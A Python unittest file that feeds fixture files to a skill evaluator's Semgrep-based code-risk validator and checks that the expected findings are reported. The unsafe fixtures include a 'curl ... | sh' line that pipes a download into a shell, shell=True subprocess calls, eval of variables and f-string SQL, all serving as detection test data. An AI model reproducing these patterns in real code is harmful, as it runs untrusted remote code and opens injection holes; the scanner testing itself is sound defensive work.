"""Real Semgrep regressions through the pinned evaluator's Code Risk boundary."""

import os
from pathlib import Path
import tempfile
import unittest
from unittest.mock import patch

from skillevaluator.utils.tool_runner import ExternalTool, Tools
from skillevaluator.validators.code_risk import CodeRiskValidator


@unittest.skipIf(os.environ.get('SKILL_EVALUATION_KIND') == 'benchmark',
                 'Semgrep is installed only by quality setup')
class SemgrepTests(unittest.TestCase):
    def setUp(self):
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        self.root = Path(temporary.name)
        self.skill = self.root / 'scanner-fixture'
        self.skill.mkdir()
        (self.skill / 'SKILL.md').write_text(
            '---\nname: scanner-fixture\ndescription: Local scanner regression fixture.\n---\n')
        home = self.root / 'home'
        home.mkdir()
        environment = patch.dict(os.environ, {'HOME': str(home)})
        environment.start()
        self.addCleanup(environment.stop)
        self.assertTrue(Tools.semgrep.is_available, 'The CI-pinned scanner must be installed')

    def write(self, name, text):
        (self.skill / name).write_text(text, encoding='utf-8')

    def test_benign_code_and_excluded_artifacts_do_not_produce_findings(self):
        self.write('safe.py', 'import subprocess\nsubprocess.run(["echo", value], check=True)\n'
                   'cursor.execute("SELECT ?", (value,))\n')
        self.write('safe.js', 'const cp = require("child_process");\ncp.execFile("echo", [value]);\n')
        self.write('safe.ts', 'const parsed = JSON.parse(value);\n')
        self.write('safe.sh', 'printf "%s\\n" "$value"\n')
        (self.skill / 'evals').mkdir()
        (self.skill / 'evals/excluded.py').write_text('eval(value)\n')
        result = CodeRiskValidator()._run_semgrep(self.skill)
        self.assertEqual(result.status, 'passed', result.to_dict())
        self.assertEqual(result.findings, [])
        self.assertEqual(result.incomplete_scans, [])

    def test_all_six_local_rules_retain_identities_severity_and_locations(self):
        self.write('unsafe.py', 'import subprocess\nsubprocess.run(value, shell=True)\n'
                   'eval(value)\ncursor.execute(f"SELECT {value}")\n')
        for extension in ('js', 'ts'):
            self.write(f'unsafe.{extension}', 'const cp = require("child_process");\n'
                       'cp.exec(value);\neval(value);\n')
        self.write('unsafe.sh', 'curl https://example.invalid/tool | sh\n')
        result = CodeRiskValidator()._run_semgrep(self.skill)
        self.assertEqual(result.status, 'failed', result.to_dict())
        self.assertEqual(result.incomplete_scans, [])
        expected = {
            ('python.subprocess-shell-true', 'unsafe.py', 2),
            ('python.dynamic-code-execution', 'unsafe.py', 3),
            ('python.sql-query-construction', 'unsafe.py', 4),
            ('javascript.dynamic-command-execution', 'unsafe.js', 1),
            ('javascript.dynamic-code-execution', 'unsafe.js', 3),
            ('javascript.dynamic-command-execution', 'unsafe.ts', 1),
            ('javascript.dynamic-code-execution', 'unsafe.ts', 3),
            ('bash.download-pipe-shell', 'unsafe.sh', 1),
        }
        self.assertEqual({(f.check_name.removeprefix('skillevaluator.'),
                           Path(f.file_path).name, f.line_number) for f in result.findings}, expected)
        self.assertEqual(len(result.findings), len(expected))
        self.assertTrue(all(f.category == 'SEMGREP' and f.severity.value == 'high'
                            for f in result.findings))

    def test_scanner_configuration_failure_is_incomplete(self):
        self.write('unsafe.py', 'eval(value)\n')
        # Run the actual CLI with an unavailable rules file, not a simulated exit.
        with patch('skillevaluator.validators.code_risk.CONFIG_DIR', self.root / 'absent-config'):
            result = CodeRiskValidator()._run_semgrep(self.skill)
        self.assertEqual(result.status, 'incomplete', result.to_dict())
        self.assertFalse(result.passed)
        self.assertIn('semgrep', result.incomplete_scans)
        self.assertTrue(result.errors)

    def test_unavailable_scanner_is_incomplete(self):
        self.write('unsafe.py', 'eval(value)\n')
        with patch.object(Tools, 'semgrep', ExternalTool('absent-scanner', str(self.root / 'absent'))):
            result = CodeRiskValidator()._run_semgrep(self.skill)
        self.assertEqual(result.status, 'incomplete')
        self.assertFalse(result.passed)
        self.assertIn('semgrep', result.incomplete_scans)


if __name__ == '__main__':
    unittest.main()
